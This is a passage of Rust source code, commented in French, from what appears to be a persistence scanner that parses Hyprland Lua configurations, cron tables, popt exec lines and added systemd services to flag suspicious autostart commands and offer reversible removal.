                || matches!(jetons.get(k.saturating_add(1)).map(|(j, _)| j), Some(JetonLua::Signe(s)) if s == "=")
        }
    })
}

/// Les valeurs posées pour chaque nom du fichier (`LocalesLua`) : « nom = valeur » au niveau des instructions (pas
/// un champ de table « { nom = … } », pas un argument), chaque nom d'une liste « a, b = … », d'une boucle « for » ou
/// des paramètres d'une fonction sans valeur lue ; une valeur faite d'autres noms relue tant qu'elle change (au plus
/// 8 fois) ; une valeur qui se nomme elle-même, un appel ou une fonction : non lue. Toutes les portées ensemble : un
/// nom vaut chacune de ses valeurs écrites, et n'importe quoi si l'une ne se lit pas.
fn locales_lua(jetons: &[(JetonLua, usize)]) -> LocalesLua {
    let signe = |k: usize, s: &str| matches!(jetons.get(k).map(|(j, _)| j), Some(JetonLua::Signe(x)) if x == s);
    let mut locales: LocalesLua = std::collections::BTreeMap::new();
    let mut a_relire: Vec<(String, usize, usize)> = Vec::new();
    // Les groupes ouverts : « ( », « { », « [ », et « B » pour un bloc (function, do, if, repeat).
    let mut ouverts: Vec<char> = Vec::new();
    for (k, (j, _)) in jetons.iter().enumerate() {
        let nom = match j {
            JetonLua::Signe(s) if ["(", "{", "["].contains(&s.as_str()) => {
                ouverts.push(s.chars().next().unwrap_or('('));
                continue;
            }
            JetonLua::Signe(s) if [")", "}", "]"].contains(&s.as_str()) => {
                ouverts.pop();
                continue;
            }
            JetonLua::Nom(n) if ["function", "do", "if", "repeat"].contains(&n.as_str()) => {
                // Les paramètres d'une fonction (« function f(c) », « function(c) ») : liés à ce que l'appel donne
                // (vérification 2, N9 : « local function run(c) hl.exec_cmd(c) end » ne vaut pas la locale « c »).
                let mut p = k.saturating_add(1);
                if n == "function" && matches!(jetons.get(p).map(|(j, _)| j), Some(JetonLua::Nom(_))) {
                    p = p.saturating_add(1);
                }
                if n == "function" && signe(p, "(") {
                    let fin = fermeture_lua(jetons, p);
                    for (param, _) in jetons.get(p.saturating_add(1)..fin).unwrap_or_default() {
                        if let JetonLua::Nom(param) = param {
                            locales.entry(param.clone()).or_default().push(None);
                        }
                    }
                }
                ouverts.push('B');
                continue;
            }
            JetonLua::Nom(n) if n == "for" => {
                // Les variables d'une boucle (« for _, cmd in … », « for cmd in … », « for i = … ») : sans valeur lue.
                let mut p = k.saturating_add(1);
                while let Some((j, _)) = jetons.get(p) {
                    match j {
                        JetonLua::Nom(v) if !MOTS_CLES_LUA.contains(&v.as_str()) => {
                            locales.entry(v.clone()).or_default().push(None);
                        }
                        JetonLua::Signe(s) if s == "," => {}
                        _ => break,
                    }
                    p = p.saturating_add(1);
                }
                continue;
            }
            JetonLua::Nom(n) if n == "end" || n == "until" => {
                ouverts.pop();
                continue;
            }
            // « _G.c = … » pose le global « c ».
            JetonLua::Nom(n) if !MOTS_CLES_LUA.contains(&n.as_str()) => nom_global(n).to_string(),
            _ => continue,
        };
        if ouverts.last().is_some_and(|o| *o != 'B') {
            continue;
        }
        // Une liste de noms suivie de « = » ou de « in » : chaque nom sans valeur lue.
        let mut m = k;
        while signe(m.saturating_add(1), ",")
            && matches!(jetons.get(m.saturating_add(2)).map(|(j, _)| j), Some(JetonLua::Nom(_)))
        {
            m = m.saturating_add(2);
        }
        let apres_liste = |s: &str| signe(m.saturating_add(1), s);
        let precede_d_une_virgule = k.checked_sub(1).is_some_and(|p| signe(p, ","));
        if (m > k
            && (apres_liste("=")
                || matches!(jetons.get(m.saturating_add(1)).map(|(j, _)| j), Some(JetonLua::Nom(n)) if n == "in")))
            || (precede_d_une_virgule && signe(k.saturating_add(1), "="))
        {
            locales.entry(nom.clone()).or_default().push(None);
            continue;
        }
        if !signe(k.saturating_add(1), "=") {
            continue;
        }
        // La valeur : termes joints par « .. » (chaîne, nom, groupe, « os.getenv(…) »).
        let debut = k.saturating_add(2);
        let mut fin = debut;
        loop {
            match jetons.get(fin).map(|(j, _)| j) {
                Some(JetonLua::Signe(s)) if s == "(" => fin = fermeture_lua(jetons, fin).saturating_add(1),
                Some(JetonLua::Nom(n)) if n == "os.getenv" && signe(fin.saturating_add(1), "(") => {
                    fin = fermeture_lua(jetons, fin.saturating_add(1)).saturating_add(1);
                }
                Some(JetonLua::Nom(n)) if MOTS_CLES_LUA.contains(&n.as_str()) => break,
                Some(JetonLua::Chaine(_) | JetonLua::Nom(_)) => fin = fin.saturating_add(1),
                _ => break,
            }
            if signe(fin, "..") {
                fin = fin.saturating_add(1);
            } else {
                break;
            }
        }
        // Suivie d'une autre valeur, d'un appel ou d'un calcul : non lue.
        let finie = match jetons.get(fin).map(|(j, _)| j) {
            None => true,
            Some(JetonLua::Nom(n)) => n != "and" && n != "or",
            Some(JetonLua::Signe(s)) => s == ";" || s == ")" || s == "}" || s == "]",
            Some(JetonLua::Chaine(_)) => false,
        };
        locales.entry(nom.clone()).or_default().push(None);
        if finie && fin > debut {
            a_relire.push((nom.clone(), debut, fin));
        }
    }
    // Chaque valeur lue remplace une valeur non lue de son nom, une seule fois.
    let mut lues = vec![false; a_relire.len()];
    for _ in 0..8 {
        let mut change = false;
        for ((nom, debut, fin), lue) in a_relire.iter().zip(lues.iter_mut()) {
            if *lue {
                continue;
            }
            let Some(formes) = valeurs_lua(jetons.get(*debut..*fin).unwrap_or_default(), &locales) else {
                continue;
            };
            let valeurs = locales.entry(nom.clone()).or_default();
            if let Some(trou) = valeurs.iter().position(Option::is_none) {
                valeurs.remove(trou);
            }
            valeurs.extend(formes.into_iter().map(Some));
            *lue = true;
            change = true;
        }
        if !change {
            break;
        }
    }
    locales
}

/// Les appels d'un fichier Lua de Hyprland qui lancent une commande ou chargent du code (`appel_lua`), lus sur
/// les jetons du fichier entier (relecture adverse, B4 et C9 : « f "…" », « f [[…]] », « f (…) », un appel sur
/// autant de lignes qu'il faut), et ce qui renomme ou redéfinit une fonction qui lance (« local e = os.execute »,
/// « function o.launch(…) »), change le chemin des modules (« package.path = … ») ou indexe « os », « io »,
/// « package », « _G » par un calcul. Lecture au mieux : Lua est un langage ; ce qui ne se lit pas est dit, jamais
/// tu (modèle de menace).
fn appels_lua(texte: &str) -> Vec<AppelLu> {
    let jetons = jetons_lua(texte);
    let ligne_de = |k: usize| jetons.get(k).map_or(0, |(_, l)| *l);
    let locales = locales_lua(&jetons);
    let mut appels = Vec::new();
    for (k, (j, l)) in jetons.iter().enumerate() {
        let JetonLua::Nom(nom) = j else { continue };
        let precedent = k.checked_sub(1).and_then(|p| jetons.get(p)).map(|(j, _)| j);
        let suivant = jetons.get(k.saturating_add(1)).map(|(j, _)| j);
        let racine = nom.trim_start_matches("_G.").trim_start_matches("_ENV.");
        // « package.path = … », « os[…] », « _G[x] » : ce qui se charge ou se lance ne se voit plus.
        let chemin_change = ["package.path", "package.cpath", "package.searchers", "package.preload"]
            .iter()
            .any(|p| racine == *p || racine.starts_with(&format!("{p}.")));
        // « hl[k](…) », « hl["exec" .. "_cmd"](…) » : une fonction de Hyprland ou d'Omarchy prise par un nom calculé
        // (vérification 2, N9).
        let global = nom_global(nom);
        let indexe = (["os", "io", "package", "_G", "_ENV", "debug"].contains(&nom.rsplit('.').next().unwrap_or(nom))
            || ["hl", "hl.dsp", "hl.plugin", "o"].contains(&global))
            && matches!(suivant, Some(JetonLua::Signe(s)) if s == "[");
        // Une bibliothèque qui lance prise comme valeur (« pairs(os) », « local h = hl ») : ce qu'on en tire ne se
        // voit plus (vérification 2, N9). Pas une comparaison ni « x or … » ; « _ENV », toujours.
        let compare = |j: Option<&JetonLua>| {
            matches!(j, Some(JetonLua::Signe(s)) if s == "==" || s == "~=")
                || matches!(j, Some(JetonLua::Nom(n)) if n == "or" || n == "and" || n == "not")
        };
        let valeur = nom == "_ENV"
            || (["os", "io", "package", "debug", "hl", "hl.dsp", "hl.plugin"].contains(&global) || nom == "_G")
                && !compare(precedent)
                && !compare(suivant);
        if chemin_change || indexe || valeur {
            appels.push(AppelLu {
                debut: *l,
                fin: *l,
                commandes: Vec::new(),
                textes: Vec::new(),
                modules: Vec::new(),
                fichiers: Vec::new(),
                non_lu: Some(code_lua_non_lu()),
            });
            continue;
        }
        let Some(sorte) = appel_lua(nom) else { continue };
        // Un champ de table (« { launch = "obsidian" } », forme des raccourcis d'Omarchy) : un nom simple suivi de
        // « = » après « { », « , » ou « ; ». Sa valeur se lit avec l'appel qui la reçoit ; ce n'est pas une
        // fonction redéfinie (« o.launch = … », nom composé, le reste).
        let champ = !nom.contains('.')
            && matches!(suivant, Some(JetonLua::Signe(s)) if s == "=")
            && matches!(precedent, Some(JetonLua::Signe(s)) if ["{", ",", ";"].contains(&s.as_str()));
        if champ {
            continue;
        }
        let ouvre = match suivant {
            Some(JetonLua::Signe(s)) if s == "(" || s == "{" => true,
            Some(JetonLua::Chaine(_)) => true,
            _ => false,
        };
        let definie = matches!(precedent, Some(JetonLua::Nom(n)) if n == "function");
        if definie || !ouvre {
            appels.push(AppelLu {
                debut: *l,
                fin: *l,
                commandes: Vec::new(),
                textes: Vec::new(),
                modules: Vec::new(),
                fichiers: Vec::new(),
                non_lu: Some(fonction_lua_renommee()),
            });
            continue;
        }
        let (arguments, fin): (Vec<&[(JetonLua, usize)]>, usize) = match suivant {
            Some(JetonLua::Signe(s)) if s == "(" => {
                let fin = fermeture_lua(&jetons, k.saturating_add(1));
                (
                    elements_lua(jetons.get(k.saturating_add(2)..fin).unwrap_or_default()),
                    fin,
                )
            }
            Some(JetonLua::Signe(_)) => {
                let fin = fermeture_lua(&jetons, k.saturating_add(1));
                (vec![jetons.get(k.saturating_add(1)..=fin).unwrap_or_default()], fin)
            }
            _ => (
                vec![
                    jetons
                        .get(k.saturating_add(1)..=k.saturating_add(1))
                        .unwrap_or_default(),
                ],
                k.saturating_add(1),
            ),
        };
        let mut appel = AppelLu {
            debut: *l,
            fin: ligne_de(fin),
            commandes: Vec::new(),
            textes: Vec::new(),
            modules: Vec::new(),
            fichiers: Vec::new(),
            non_lu: None,
        };
        match sorte {
            AppelLua::Code => appel.non_lu = Some(code_lua_non_lu()),
            AppelLua::Lance | AppelLua::Raccourci => {
                // Le premier argument d'un raccourci nomme ses touches (« mod .. " + " .. i » dans une boucle), et
                // le deuxième d'un « o.bind(touches, description, action) » d'Omarchy (trois arguments ou plus, pas
                // « hl.bind(touches, action, options) ») sa description : jugés s'ils se lisent, sans constat sinon ;
                // rien ne les lance. Un « bind » redéfini dans un fichier lu est levé à part (`fonction_lua_renommee`).
                let description = sorte == AppelLua::Raccourci && arguments.len() >= 3 && !racine.starts_with("hl.");
                // Vérification 3 : le seul argument qui se lance passe la liste permise ; les autres (règles de
                // fenêtre d'« exec_cmd(c, règles) », mode d'« io.popen(c, "r") », motif de « launch_sole(motif, c) »,
                // options d'un raccourci) ne sont que du texte, jugé par ses mots. Les aides d'applications web
                // rendent la commande d'Omarchy (helpers.lua), chaque argument entre guillemets simples.
                let fin_du_nom = racine.rsplit('.').next().unwrap_or(racine);
                let web = match fin_du_nom {
                    "launch_webapp" => Some("omarchy-launch-webapp"),
                    "launch_webapp_sole" => Some("omarchy-launch-or-focus-webapp"),
                    _ => None,
                };
                if let Some(programme) = web {
                    let mut mots = vec![programme.to_string()];
                    let lu = arguments.iter().all(|a| {
                        let mut v = Vec::new();
                        let lu = litterale_lua(a) && element_lu(a, &locales, &mut v);
                        match v.as_slice() {
                            [seul] if lu => {
                                mots.push(format!("'{}'", seul.replace('\'', "'\\''")));
                                true
                            }
                            _ => false,
                        }
                    });
                    if lu {
                        appel.commandes.push(mots.join(" "));
                    } else {
                        appel.non_lu = Some(commande_lua_non_lue());
                    }
                } else {
                    let lance = match (sorte, fin_du_nom) {
                        (AppelLua::Raccourci, _) => {
                            if description {
                                2
                            } else {
                                1
                            }
                        }
                        (_, "launch_sole") => 1,
                        _ => 0,
                    };
                    let lus = arguments
                        .iter()
                        .enumerate()
                        .filter(|(k, a)| {
                            // Lu d'abord : ses mots se jugent même pour les touches.
                            let sans_lancement = *k != lance;
                            let lu = if sans_lancement {
                                element_lu(a, &locales, &mut appel.textes)
                            } else {
                                litterale_lua(a) && element_lu(a, &locales, &mut appel.commandes)
                            };
                            !(lu || sans_lancement)
                        })
                        .count();
                    if lus > 0 {
                        appel.non_lu = Some(commande_lua_non_lue());
                    }
                }
            }
            AppelLua::Fichier => match arguments.first().and_then(|c| valeurs_lua(c, &locales)) {
                Some(chemins) => {
                    appel.textes.extend(chemins.iter().cloned());
                    appel.fichiers = chemins;
                }
                None => appel.non_lu = Some(code_lua_non_lu()),
            },
            AppelLua::Module => match arguments.first().and_then(|a| valeurs_lua(a, &locales)) {
                Some(noms) => appel.modules = noms,
                None => appel.non_lu = Some(code_lua_non_lu()),
            },
        }
        if appel.non_lu.is_some()
            || !appel.commandes.is_empty()
            || !appel.textes.is_empty()
            || !appel.modules.is_empty()
        {
            appels.push(appel);
        }
    }
    appels
}

/// Les variables de Hyprland (« $nom = valeur ») posées dans ses fichiers lus, chaque valeur écrite pour chaque nom,
/// lignes jointes comme hyprlang (`lignes_de_hyprlang`) : Hyprland les remplace dans une ligne avant de la lire.
/// Tout nom que hyprlang accepte (relecture adverse, B2 : « $HOME-x », « $a b ») : ce qui est entre « $ » et « = ».
fn variables_de_hypr<'a>(
    fichiers: impl Iterator<Item = &'a std::path::PathBuf>,
) -> std::collections::BTreeMap<String, Vec<String>> {
    let mut variables: std::collections::BTreeMap<String, Vec<String>> = std::collections::BTreeMap::new();
    for f in fichiers {
        let Ok(lu) = temoins::lire_borne(f, LECTURE_MAX) else {
            continue;
        };
        for (_, _, l) in lignes_de_hyprlang(&String::from_utf8_lossy(&lu.octets)) {
            let Some((nom, valeur)) = l.trim_start().strip_prefix('$').and_then(|r| r.split_once('=')) else {
                continue;
            };
            let nom = nom.trim();
            if nom.is_empty() {
                continue;
            }
            // « # » commence un commentaire, « ## » l'écrit.
            let valeur = if valeur.contains("##") {
                valeur.replace("##", "#")
            } else {
                valeur.split('#').next().unwrap_or_default().to_string()
            };
            variables
                .entry(nom.to_string())
                .or_default()
                .push(valeur.trim().to_string());
        }
    }
    variables
}

/// Au plus autant de formes d'une commande aux variables remplacées : au-delà, elle ne se juge pas.
const FORMES_MAX: usize = 32;

/// Les formes que prend la `commande` d'une ligne de Hyprland une fois ses variables remplacées (chaque valeur
/// posée, le nom le plus long d'abord, comme Hyprland), ou `None` : une variable reste sans valeur connue (seul
/// $HOME, que le shell connaît, peut rester), une boucle, ou trop de formes.
fn resoudre_hypr(commande: &str, variables: &std::collections::BTreeMap<String, Vec<String>>) -> Option<Vec<String>> {
    let nom_de = |reste: &str| -> usize {
        reste
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
            .count()
    };
    let mut a_faire = vec![(commande.to_string(), 0_u32)];
    let mut formes = Vec::new();
    while let Some((c, profondeur)) = a_faire.pop() {
        // La première variable de Hyprland de la commande : le plus long nom posé qui suit « $ », quelles que soient
        // ses lettres ; une variable posée l'emporte sur celle de l'environnement (relecture adverse, B2).
        let trouvee = c.match_indices('$').find_map(|(i, _)| {
            let reste = c.get(i.checked_add(1)?..)?;
            variables
                .iter()
                .filter(|(nom, _)| reste.starts_with(nom.as_str()))
                .max_by_key(|(nom, _)| nom.len())
                .map(|(nom, valeurs)| (i, nom.len(), valeurs))
        });
        if let Some((i, longueur, valeurs)) = trouvee {
            if profondeur >= 8 {
                return None;
            }
            for v in valeurs {
                let fin = i.checked_add(1)?.checked_add(longueur)?;
                let forme = format!("{}{v}{}", c.get(..i)?, c.get(fin..)?);
                a_faire.push((forme, profondeur.saturating_add(1)));
            }
        } else {
            let reste_inconnu = c.match_indices('$').any(|(i, _)| {
                let apres = c.get(i.saturating_add(1)..).unwrap_or_default();
                let n = nom_de(apres);
                !(apres.get(..n) == Some("HOME") || apres.starts_with("{HOME}"))
            });
            if reste_inconnu {
                return None;
            }
            formes.push(c);
        }
        if formes.len().saturating_add(a_faire.len()) > FORMES_MAX {
            return None;
        }
    }
    Some(formes)
}

/// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
/// compte qui la lance. Coupée comme la coupe cron : espace et tabulation.
fn commande_de_cron(l: &str, systeme: bool) -> String {
    let l = l.trim_matches([' ', '\t']);
    let champs: usize = match (l.starts_with('@'), systeme) {
        (true, false) => 1,
        (true, true) => 2,
        (false, false) => 5,
        (false, true) => 6,
    };
    l.split([' ', '\t'])
        .filter(|m| !m.is_empty())
        .skip(champs)
        .collect::<Vec<_>>()
        .join(" ")
}

/// La crontab du compte et celles du système : chaque ligne est une commande.
fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
    let etc = |chemin: &str| racine.join(chemin);
    let crontab = crontab.unwrap_or_default();
    // La crontab du compte n'a pas de fichier qu'un geste de défense toucherait ; son texte entier est son témoin.
    for (n, l) in crontab.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            t.sources.push(source_de("crontab", l));
            t.retraits.push(None);
            let numero = n.saturating_add(1);
            // Hors du périmètre déclarable : la crontab du compte.
            t.temoins.push(Err(hors_des_deux(&format!("crontab:{numero}"))));
            t.suspects.push(trf!("crontab : {raison}", "crontab: {raison}"));
        }
    }
    let mut fichiers_cron = vec![etc("etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir(etc("etc/cron.d"))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    let h = t.r.maison.clone();
    for f in fichiers_cron {
        let Some(lu) = lire(&f, &h, t) else {
            continue;
        };
        let source = crate::ui::chemin_affichable(&f);
        for (n, l) in lu.texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
            if let Some(raison) = commande_suspecte(l, false) {
                t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
                t.retraits.push(retrait(&f, &lu.texte, l));
                let d = designes::commande(&commande_de_cron(l, true), designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, true, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
            }
        }
    }
}

/// Les lignes d'un réglage de popt comme popt les lit (`poptReadConfigFile`, popt 1.19) : « \\ » suivi d'une fin
/// de ligne est ôté (la ligne continue sur la suivante, sans blanc), puis chaque ligne, blancs de tête ôtés, qui ne
/// commence pas par « # ». Chacune telle qu'écrite (sans son « \r » final, comme `lines()`), avec le numéro de sa
/// première ligne écrite (à partir de 0) et si elle tient sur une seule ligne écrite. La dernière ligne sans fin de
/// ligne compte aussi (popt la saute peut-être : en trop, jamais en moins).
fn lignes_de_popt(texte: &str) -> Vec<(usize, String, bool)> {
    let mut sortie = Vec::new();
    let mut cours: Option<(usize, String, bool)> = None;
    for (n, brute) in texte.split('\n').enumerate() {
        let (debut, mut l, simple) = cours.take().unwrap_or((n, String::new(), true));
        let simple = simple && l.is_empty();
        if let Some(avant) = brute.strip_suffix('\\') {
            l.push_str(avant);
            cours = Some((debut, l, false));
        } else {
            l.push_str(brute.strip_suffix('\r').unwrap_or(brute));
            let net = l.trim_start();
            if !net.is_empty() && !net.starts_with('#') {
                sortie.push((debut, l, simple));
            }
        }
    }
    if let Some((debut, l, _)) = cours {
        let net = l.trim_start();
        if !net.is_empty() && !net.starts_with('#') {
            sortie.push((debut, l, false));
        }
    }
    sortie
}

/// La commande d'une ligne de popt « `<programme> exec <option> <commande>` » (`poptConfigLine` : des mots séparés
/// par des blancs, le type exactement « exec »), ou `None` : une autre ligne (« alias », que Vanguard ne juge pas :
/// elle ajoute des options, sans lancer de programme elle-même). Une commande vide : une ligne « exec » sans commande.
fn exec_de_popt(ligne: &str) -> Option<String> {
    let mut reste = ligne.trim_start();
    let mut mot = || {
        let fin = reste.find(char::is_whitespace).unwrap_or(reste.len());
        let (m, apres) = reste.split_at(fin);
        reste = apres.trim_start();
        m
    };
    let (_programme, sorte, _option) = (mot(), mot(), mot());
    if sorte != "exec" {
        return None;
    }
    Some(reste.trim_end().to_string())
}

/// Les réglages de popt (D-1, relecture 0.94 : rsync les lit au départ) : ~/.popt, puis /etc/popt, /usr/etc/popt et
/// chaque fichier de leurs popt.d. Une ligne « exec » lance un programme quand le programme nommé reçoit l'option :
/// sa commande se juge comme une ligne lancée (`juger_lancement`, liste permise là où le compte écrit ; un fichier
/// que seul root peut changer, celle de root, comme ailleurs). Une ligne « exec » sans commande, là où le compte écrit,
/// est levée comme ce qui ne se lit pas. Un réglage présent qui ne se lit pas (dossier, illisible, popt.d qui ne se
/// parcourt pas) est dit, jamais sauté (relecture 0.95, V-8) : levé s'il est au compte ou que le compte peut le
/// changer, en information s'il est à root seul (rsync, lancé par le même compte, ne le lit pas non plus).
fn juger_popt(t: &mut Lancements) {
    let h = t.r.maison.clone();
    let compte = h.join(".popt");
    let mut fichiers = vec![compte.clone()];
    for d in ["etc", "usr/etc"] {
        let d = t.r.racine.join(d);
        fichiers.push(d.join("popt"));
        let dossier = d.join("popt.d");
        let dans: std::io::Result<Vec<std::path::PathBuf>> =
            std::fs::read_dir(&dossier).and_then(|e| e.map(|e| e.map(|e| e.path())).collect());
        match dans {
            Ok(mut dans) => {
                dans.sort();
                fichiers.extend(dans);
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound && std::fs::symlink_metadata(&dossier).is_err() => {}
            Err(_) => popt_non_lu(t, &dossier, false),
        }
    }
    for f in fichiers {
        let Some(lu) = lire(&f, &h, t) else {
            // Un tube, `lire` l'a déjà dit ; tout autre réglage présent qui ne se lit pas : dit ici.
            let tube = std::fs::metadata(&f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type()));
            if std::fs::symlink_metadata(&f).is_ok() && !tube {
                popt_non_lu(t, &f, f == compte);
            }
            continue;
        };
        for (n, ligne, simple) in lignes_de_popt(&lu.texte) {
            let sorte = Sorte::Ajoutee(Ajout::Popt);
            match exec_de_popt(&ligne) {
                Some(commande) if !commande.is_empty() => {
                    juger_lancement(t, &f, &lu, n, &ligne, &commande, false, sorte, simple, &Lecteur::Brut);
                }
                Some(_) if !de_root_seul(&f) => {
                    lever(t, &f, &lu, n, &ligne, "", true, sorte, simple, shell_non_lu());
                }
                // « alias », ou « exec » sans commande dans un fichier que seul root change.
                Some(_) | None => {}
            }
        }
    }
}

/// Un réglage de popt `f` présent qui ne se lit pas : levé (`non_lu`) s'il est au `compte` ou que le compte peut le
/// changer ; à root seul, une information (le compte ne le lit pas plus que Vanguard), jamais un silence (V-8).
fn popt_non_lu(t: &mut Lancements, f: &Path, compte: bool) {
    let h = t.r.maison.clone();
    if compte || !de_root_seul(f) {
        non_lu(f, &h, t, tr!("présent mais illisible", "present but unreadable"));
    } else {
        t.informations.push(trf!(
            "{} : réglage de popt présent mais illisible, ce qu'il fait faire à rsync n'est pas vu",
            "{}: popt settings present but unreadable, what it makes rsync do is not seen",
            court(f, &h)
        ));
    }
}

/// Le constat des lancements : aucun suspect, ou une alerte (critique si une bibliothèque hors paquet est préchargée)
/// qui en nomme six au plus. Ce qui n'a pas été vu d'une ligne permise (`Lancements::informations`) s'y dit à la
/// fin ; sans suspect, en information (`Niveau::Info`, rien à faire), jamais en « aucun suspect » muet.
fn constat_des_lancements(t: Lancements) -> Constat {
    const CAT: &str = "Persistance";
    let Lancements {
        critiques,
        mut suspects,
        sources,
        mut retraits,
        temoins: releves,
        mut informations,
        ..
    } = t;
    suspects.sort();
    suspects.dedup();
    informations.sort();
    informations.dedup();
    let a_savoir = (!informations.is_empty()).then(|| {
        trf!(
            " À savoir, non vérifié : {}.",
            " Worth knowing, not checked: {}.",
            informations.join(" ; ")
        )
    });
    if critiques.is_empty() && suspects.is_empty() {
        let aucun = tr!(
            "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
            "No suspicious autostart (preloading, services, session startup, cron)."
        );
        return match a_savoir {
            None => ok(CAT, aucun),
            Some(a) => alerte(CAT, Niveau::Info, format!("{aucun}{a}")),
        };
    }
    let niveau = if critiques.is_empty() {
        Niveau::Eleve
    } else {
        Niveau::Critique
    };
    let mut liste = critiques;
    liste.extend(suspects);
    let total = liste.len();
    let suite = liste.split_off(liste.len().min(LIGNES_MONTREES));
    let mut message = trf!(
        "Lancement automatique suspect ({total} ligne(s)) : {}",
        "Suspicious autostart ({total} line(s)): {}",
        liste.join(" ; ")
    );
    if !suite.is_empty() {
        let _ = trw!(
            message,
            " ; et {} autre(s), par fichier : {}",
            "; and {} more, by file: {}",
            suite.len(),
            reste_par_fichier(&suite)
        );
    }
    message.push('.');
    if let Some(a) = a_savoir {
        message.push_str(&a);
    }
    let constat = alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
        tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que vous n'avez pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
        &[],
    );
    // Par des gestes de défense seulement si chaque ligne signalée est dans un fichier du système qu'un geste a le
    // droit de modifier : une ligne du dossier personnel, de la crontab du compte ou une variable de la session
    // laisse tout à la main (une correction qui en ferait une partie se croirait complète).
    retraits.dedup();
    let mut vus: Vec<&(String, String)> = Vec::new();
    let mut a_la_main = false;
    for r in &retraits {
        match r {
            Some(r) if !vus.contains(&r) => vus.push(r),
            Some(_) => {}
            None => a_la_main = true,
        }
    }
    let gestes = if a_la_main {
        Vec::new()
    } else {
        crate::machine::defense::tous(vus, |(f, l)| crate::machine::defense::retirer_ligne(f, l))
    };
    crate::machine::defense::corriger(
        constat,
        tr!(
            "Retirer ces lignes (chaque fichier est gardé entier dans sa note, Défaire le remet), puis lancer l'antivirus",
            "Remove these lines (each file is kept whole in its note, Undo puts it back), then run the antivirus"
        ),
        &gestes,
    )
    .avec_temoins(temoins::Temoins::de(releves))
}

/// Au plus autant de lignes signalées montrées en entier dans l'alerte des lancements ; les autres, par fichier.
const LIGNES_MONTREES: usize = 6;

/// Le fichier d'une ligne signalée (« ~/x.lua:12 : … » → « ~/x.lua ») ; `None` sans numéro de ligne.
fn fichier_signale(ligne: &str) -> Option<&str> {
    let octets = ligne.as_bytes();
    ligne.match_indices(':').find_map(|(i, _)| {
        let apres = octets.get(i.saturating_add(1)..)?;
        let chiffres = apres.iter().take_while(|c| c.is_ascii_digit()).count();
        (chiffres > 0 && matches!(apres.get(chiffres), Some(b' ' | b':')))
            .then(|| ligne.get(..i))
            .flatten()
    })
}

/// Les lignes signalées au-delà des premières, groupées par fichier avec leur nombre (une ligne sans fichier,
/// en entier) : une ligne de plus dans un fichier déjà signalé change son nombre, un fichier de plus se nomme
/// (deuxième vérification : « et 56 autre(s) » cachait la 63e).
fn reste_par_fichier(suite: &[String]) -> String {
    let mut fichiers: Vec<(&str, usize)> = Vec::new();
    let mut seules: Vec<&str> = Vec::new();
    for l in suite {
        match fichier_signale(l) {
            Some(f) => match fichiers.iter_mut().find(|(g, _)| *g == f) {
                Some((_, n)) => *n = n.saturating_add(1),
                None => fichiers.push((f, 1)),
            },
            None => seules.push(l),
        }
    }
    fichiers.sort_unstable();
    let mut morceaux: Vec<String> = fichiers.into_iter().map(|(f, n)| format!("{f} ({n})")).collect();
    morceaux.extend(seules.into_iter().map(str::to_string));
    morceaux.join(", ")
}

/// Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root. On les nomme
/// pour que tu les reconnaisses, sans baisser la note.
fn services_ajoutes(racine: &Path, gestion: Option<Paquets>, r: &mut Releveur) -> Option<Constat> {
    let gestion = gestion?;
    let systeme = racine.join("etc/systemd/system");
    let mut fichiers: Vec<std::path::PathBuf> = fichiers_de(&systeme, &["service", "timer"])
        .into_iter()
        .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
        .filter(|p| !gestion.possede(p))
        .collect();
    fichiers.sort();
    let ajoutes: Vec<String> = fichiers
        .iter()
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    // Un choix « normal » est lié au contenu de chaque fichier de service, à ce qu'il lance et à ses ajouts :
    // changé, l'information revient.
    let mut releves = Vec::with_capacity(fichiers.len());
    for f in &fichiers {
        let temoin = if releves.len() >= temoins::TEMOINS_MAX {
            Err(temoins::Refus(trf!(
                "plus de {} services ajoutés, plus que ceux qui se montrent avant un tel choix",
                "more than {} added services, more than can be shown before such a choice",
                temoins::TEMOINS_MAX
            )))
        } else {
            temoin_de_service(r, f)
        };
        releves.push(temoin);
    }
    // Seulement depuis la vraie racine : les noms d'une arborescence fabriquée ne désignent rien de cet ordinateur.
    juger_services_ajoutes(&ajoutes, racine == Path::new("/")).map(|c| c.avec_temoins(temoins::Temoins::de(releves)))
}

/// Le témoin d'un service système ajouté à la main : son fichier, chaque programme que lancent ses lignes « Exec… »
/// (`designes`, comme une unité du système), et ses ajouts (`unite`).
fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temoins::Refus> {
    let montre = crate::ui::chemin_affichable(f);
    let lu = temoins::lire_borne(f, AJOUT_MAX)
        .map_err(|e| temoins::Refus(trf!("{montre} ne se lit pas ({e})", "{montre} cannot be read ({e})")))?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{montre} est trop gros pour être relu à chaque bilan",
            "{montre} is too large to be re-read at each check"
        )));
    }
    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
        return Err(octet_refuse(&montre));
    };
    let mut cibles_liees = Vec::new();
    for l in texte.lines() {
        let Some((commande, _)) = commande_lancee_lue(l) else {
            continue;
        };
        let d = designes::commande(&commande, designes::Contexte::Unite(None));
        cibles_liees.extend(cibles(r, d, l, true)?);
    }
    // Les lignes Exec du fichier sont liées ci-dessus ; `unite` lie celles de ses ajouts.
